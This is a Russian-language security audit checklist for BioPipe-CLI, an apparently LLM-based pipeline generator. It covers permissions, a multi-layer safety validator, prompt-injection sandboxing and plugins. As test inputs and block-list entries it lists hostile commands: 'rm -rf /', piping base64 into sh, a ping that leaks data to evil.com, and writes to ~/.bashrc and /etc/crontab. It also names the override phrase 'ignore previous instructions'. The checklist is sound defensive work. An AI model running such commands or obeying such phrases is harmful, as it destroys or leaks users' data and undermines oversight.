# BioPipe-CLI Security Audit Checklist

Инструкция для проверки ядра BioPipe-CLI на безопасность, защиту и надёжность.
Предназначена для: бета-тестеров, системных инженеров, инженеров ПО,
инженеров компьютерных серверов, и для анализа через ИИ.

Для каждого пункта: проверь код, напиши verdict (PASS / FAIL / PARTIAL),
укажи файл и строку, предложи fix если FAIL.

---

## A. Иммутабельность критических объектов

Цель: убедиться что после инициализации критические объекты нельзя изменить.

- [ ] A1. Config (`core/config.py`) — frozen=True dataclass? Можно ли сделать
      `config.permission_level = EXECUTE` после создания?
- [ ] A2. PermissionPolicy (`core/permissions.py`) — system_level read-only property?
      Можно ли сделать `policy.system_level = EXECUTE`?
- [ ] A3. SafetyValidator (`core/safety.py`) — allowlist хранится как frozenset?
      Можно ли сделать `validator._allowlist.add("rm")`?
- [ ] A4. ToolCall (`core/types.py`) — frozen=True? Можно ли модифицировать
      parameters после создания?
- [ ] A5. SandboxedInput (`core/types.py`) — frozen=True? Можно ли подменить
      sanitized после создания?
- [ ] A6. SafetyViolation (`core/types.py`) — frozen=True?
- [ ] A7. PluginManifest (`core/plugin_sdk.py`) — frozen=True?

## B. Permission System

- [ ] B1. PermissionPolicy.check() — блокирует ли tool с required_permission > GENERATE?
- [ ] B2. ToolRegistry.register() — отклоняет ли tool с permission > GENERATE на этапе регистрации?
- [ ] B3. ToolRegistry.register() — проверяет ли forbidden overrides (__getattr__, __setattr__)?
- [ ] B4. PluginLoader._validate_manifest() — блокирует ли forbidden capabilities
      (execute, network, disable_safety)?
- [ ] B5. PluginLoader._validate_tool() — проверяет ли permission level каждого tool из плагина?
- [ ] B6. Есть ли ЛЮБОЙ путь обхода permission check? Проверить что КАЖДЫЙ вызов
      tool.execute() проходит через ToolScheduler → PermissionPolicy.check().
- [ ] B7. Можно ли зарегистрировать tool напрямую в registry._tools dict обходя register()?
      (проверить что _tools не доступен извне)

## C. Safety Validator (10 layers)

Для каждого слоя: подать тестовый вход, убедиться что CRITICAL блокирует.

- [ ] C1. Layer 1 (Regex blocklist): `rm -rf /`, `sudo apt`, `chmod 777`, `eval(`, `dd if=`
- [ ] C2. Layer 2 (Obfuscation): `r\m -rf`, `$'\x72m'`, `base64 --decode | sh`, `echo ... | bash`
- [ ] C3. Layer 3 (Network): `curl`, `wget`, `ping $(cat data).evil.com`, `import socket`
- [ ] C4. Layer 4 (Dependency): `pip install`, `conda install`, `apt-get install`
- [ ] C5. Layer 5 (Paths): `> ~/.bashrc`, `> /etc/crontab`, `../`, `> /dev/sda`
- [ ] C6. Layer 6 (SLURM): `--nodes=9999`, `--time=999:00:00`
- [ ] C7. Layer 7 (Metacharacters): `$UNQUOTED_VAR` без кавычек
- [ ] C8. Layer 8 (AST): `import os`, `subprocess.call`, `pickle.load`, `eval()`, `exec()`
- [ ] C9. Layer 9 (Allowlist): неизвестная команда → WARNING
- [ ] C10. Layer 10 (Best practices): отсутствие `set -euo pipefail`, шебанга, заголовка
- [ ] C11. Проходит ли safety ВСЕ 10 слоёв даже если первый слой нашёл CRITICAL?
       (timing side-channel: если останавливается рано, атакующий узнаёт паттерны)
- [ ] C12. Возвращает ли safety ВСЕГДА script_hash? (для audit trail)
- [ ] C13. Является ли SafetyValidator.validate() чистой функцией?
       (нет side effects, нет записи на диск, нет сетевых вызовов)

## D. Input Sandbox

- [ ] D1. InputSandbox.wrap() — стрипает ли `[INST]`, `<<SYS>>`, `<|im_start|>`?
- [ ] D2. Стрипает ли собственные delimiters (`<user_request>`, `</user_request>`)?
- [ ] D3. Injection scoring — score > 0 для "ignore previous instructions"?
- [ ] D4. SandboxedInput — frozen=True?
- [ ] D5. format_for_llm() — оборачивает ли в XML-теги?
- [ ] D6. Session.add_user_message() — всегда ли проходит через sandbox?
       Есть ли путь добавить user message обходя sandbox?

## E. Session Security

- [ ] E1. SessionManager.restore() — принимает ли из JSON ТОЛЬКО первый SYSTEM message
       как system prompt? Или позволяет инжектировать дополнительные SYSTEM messages?
- [ ] E2. Compaction — сохраняет ли оригинальный system prompt неизменным?
       После compact(), messages()[0].content == original system prompt?
- [ ] E3. PipelineState — переживает ли compaction без потерь?
- [ ] E4. Может ли плагин получить доступ к session._messages напрямую?
- [ ] E5. export() — не экспортирует ли секретные данные (API ключи, injection scores)?

## F. Config Security

- [ ] F1. Config.load() — блокирует ли remote ollama_url?
       `ollama_url = "http://evil.com:11434"` → должен raise ValueError.
- [ ] F2. Config.load() — фильтрует ли опасные инструменты из allowlist?
       Или принимает любой список из env/toml?
- [ ] F3. Config — frozen=True после создания? `config.model = "evil"` → AttributeError?
- [ ] F4. DEFAULT_ALLOWLIST — содержит ли `rm`, `sudo`, `curl`? (не должен)
- [ ] F5. Может ли biopipe.toml в текущей директории переопределить permission_level
       на EXECUTE? (config injection vector)

## G. Agent Loop Security

- [ ] G1. max_iterations — есть ли лимит? Что если LLM зациклился?
- [ ] G2. Safety check — применяется ли к КАЖДОМУ ответу LLM, не только к tool results?
- [ ] G3. Safety check — применяется ли к tool результатам с artifacts?
- [ ] G4. RAG injection — RAG-контекст оборачивается ли в теги, отделяющие от user input?
- [ ] G5. Может ли LLM через tool_calls вызвать tool, который не зарегистрирован?
       (router.resolve() должен вернуть ToolNotFoundError)

## H. Logger Security

- [ ] H1. Redaction — скрывает ли поля с ключами api_key, token, secret, password?
- [ ] H2. Truncation — обрезает ли значения > 10KB?
- [ ] H3. Log injection — если user input содержит JSON, не ломает ли структуру лога?
       (каждая строка лога должна быть валидный JSON)
- [ ] H4. Не логирует ли геномные данные? (никогда)

## I. Execution Engine Security (если EXECUTE включён)

- [ ] I1. 4 gate проверки: permission → plan approved → safety passed → user confirmed.
       Все 4 обязательны. Одного False достаточно для блокировки.
- [ ] I2. Без ApprovalStatus.APPROVED — выполнение невозможно?
- [ ] I3. Без user_confirmed=True — выполнение невозможно?
- [ ] I4. Safety блокирует скрипт с `rm -rf` даже при EXECUTE уровне?
- [ ] I5. Timeout — скрипт прерывается после 1 часа?

## J. Plugin Security

- [ ] J1. Forbidden capabilities — все 8 заблокированы?
       (execute, network, write_system, modify_core, escalate_permission,
        disable_safety, access_env, raw_llm)
- [ ] J2. Plugin output проходит через SafetyValidator? Те же 10 слоёв что и core?
- [ ] J3. Plugin не может обратиться к runtime._config / runtime._safety / runtime._session
       напрямую? (проверить инкапсуляцию)
- [ ] J4. Malicious plugin: `os.system("rm -rf /")` внутри execute() — блокируется ли?
       (AST layer должен ловить в output, но execute() сам может вызвать)
- [ ] J5. Plugin manifest с entry_point = "os" — что произойдёт?
       (importlib.import_module("os") не должен пройти валидацию)

## K. Path & File Security

- [ ] K1. PathValidator — блокирует ли `~/.bashrc`, `/etc/`, `../`, `/dev/sd`?
- [ ] K2. Output файлы — пишутся ли ТОЛЬКО в workspace (output_dir)?
- [ ] K3. Git tool — блокирует ли push, pull, fetch, remote add? (только локальные операции)
- [ ] K4. Shell tool — whitelist only? Произвольные команды заблокированы?
- [ ] K5. Workspace scanner — read-only? Не модифицирует ли файлы?

## L. Общая архитектура

- [ ] L1. Ядро зависит ТОЛЬКО от types.py contracts? Нет прямых зависимостей на конкретные реализации?
- [ ] L2. Все imports в ядре — из biopipe.core.* ? Нет imports из biopipe.generators, biopipe.plugins и т.д.?
- [ ] L3. Каждый модуль < 200 строк? Если длиннее — нужна декомпозиция.
- [ ] L4. Все функции < 30 строк? Если длиннее — нужна декомпозиция.
- [ ] L5. Type hints на каждой функции? `mypy --strict src/` проходит?
- [ ] L6. Нет `Any` типов где можно использовать конкретный тип?
- [ ] L7. Нет `# type: ignore` без объяснения?

## M. Тестовое покрытие

- [ ] M1. Каждый CRITICAL паттерн из C1-C8 покрыт отдельным тестом?
- [ ] M2. Каждый forbidden permission из J1 покрыт тестом?
- [ ] M3. E2E тест: safe script проходит полный цикл input → output?
- [ ] M4. E2E тест: malicious script блокируется SafetyBlockedError?
- [ ] M5. E2E тест: injection в prompt не влияет на safe LLM output?
- [ ] M6. Все тесты проходят? `pytest tests/ -v` → 0 failures?
- [ ] M7. Тесты не зависят от внешних сервисов (Ollama, ChromaDB, GitHub)?

---

## Как использовать эту инструкцию с ИИ

Загрузи все .py файлы из `src/biopipe/core/` и `tests/` в контекст ИИ.
Промпт:

```
Ты — security auditor. Перед тобой исходный код Python-проекта BioPipe-CLI.
Пройди по каждому пункту чеклиста ниже. Для каждого пункта:
1. Найди соответствующий код (файл, строка)
2. Проверь выполняется ли условие
3. Напиши verdict: PASS / FAIL / PARTIAL
4. Если FAIL — напиши конкретный fix (код)
5. Если PARTIAL — объясни что работает и что нет

[вставить чеклист выше]
```
